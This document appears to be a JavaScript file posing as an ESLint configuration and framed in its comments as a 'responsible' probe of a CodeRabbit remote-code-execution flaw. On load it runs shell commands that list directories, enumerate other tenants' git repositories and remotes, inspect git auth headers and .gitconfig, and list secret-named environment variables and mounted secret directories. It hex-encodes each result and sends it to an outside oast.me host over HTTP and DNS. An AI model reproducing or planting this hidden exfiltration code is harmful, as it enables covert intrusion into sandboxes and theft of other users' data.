// CodeRabbit RCE — cross-tenant residue + clone-token characterization (responsible).
// Looks for OTHER tenants' repos/tokens in the (possibly reused) sandbox.
// Token VALUES are never exfiltrated — only repo identities, header TYPE, masked env.
var C = 'd8rcd93oeaqo9b8a89eg6ugftbrp5ewqj.oast.me';
var http = require('http'), dns = require('dns'), cp = require('child_process');
var hex = function (s) { return Buffer.from(String(s)).toString('hex'); };
var httpX = function (t, d) { try { http.get({ host: C, path: '/' + t + '/' + hex(String(d)).slice(0, 1600), timeout: 7000 }, function () {}).on('error', function () {}); } catch (e) {} };
try { dns.lookup('alive4.' + C, function () {}); } catch (e) {}
var shA = function (c, t) { try { cp.exec(c, { timeout: 7000 }, function (e, o, s) { httpX(t, (o || '') + (s || '') + (e ? '|ERR:' + e.code : '')); }); } catch (x) {} };

// what else is in the (persistent?) home / tmp — other tenants' working dirs?
shA('ls -laR /home/jailuser/git 2>/dev/null | head -120', 'gitdir');
shA('ls -la /tmp /var/tmp /home/jailuser/.cache /home/jailuser/.local 2>/dev/null | head -60', 'tmp');
// enumerate ALL git repos present and their remote IDENTITIES (owner/repo) — cross-tenant tell
shA('for f in $(find /home/jailuser /tmp /var/tmp -maxdepth 6 -name config -path "*/.git/*" 2>/dev/null | head -12); do echo "== $f"; grep -aoE "github.com[/:][^ \\"\\x27]+|host=[^ ]+|extraheader" "$f" 2>/dev/null | head -3; done', 'repos');
// characterize the clone auth header TYPE only (no token value)
shA('git config --get http.extraheader 2>/dev/null | grep -aoE "^[A-Za-z-]+: [A-Za-z]+"', 'hdrtype');
shA('cat /home/jailuser/.gitconfig 2>/dev/null | grep -avE "[A-Za-z0-9+/]{20,}" | head -30', 'globalcfg');
// secrets in env (masked) + any mounted secret dirs
shA('env | grep -iE "TOKEN|KEY|SECRET|GITHUB|GITLAB|GCP|GOOGLE|AWS|PASS" | sed -E "s/=.*/=<set>/"', 'secretenv');
shA('ls -la /var/run/secrets /run/secrets /secrets 2>/dev/null | head -20', 'mounts');

module.exports = { root: true, rules: {} };
